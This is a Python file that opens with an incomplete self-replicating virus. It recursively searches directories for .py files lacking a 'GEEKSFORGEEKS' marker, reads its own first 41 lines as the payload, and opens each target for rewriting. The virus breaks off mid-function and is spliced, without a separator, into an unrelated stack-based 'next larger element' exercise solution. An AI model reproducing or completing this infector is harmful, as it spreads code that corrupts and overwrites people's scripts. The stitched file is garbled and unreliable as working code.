#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 code
class Solution:
    def nextLargerElement(self, arr, n):
        # code here
        s = []
        for i in range(len(arr)):
            while s and s[-1].get("value") < arr[i]:
                d = s.pop()
                arr[d.get("ind")] = arr[i]
            s.append({"value": arr[i], "ind": i})
        while s:
            d = s.pop()
            arr[d.get("ind")] = -1
        return arr
 
 
if __name__ == "__main__":
    print(Solution().nextLargerElement([6, 8, 0, 1, 3], 5))
# Time Complexity: O(N)
# Space Complexity: O(N)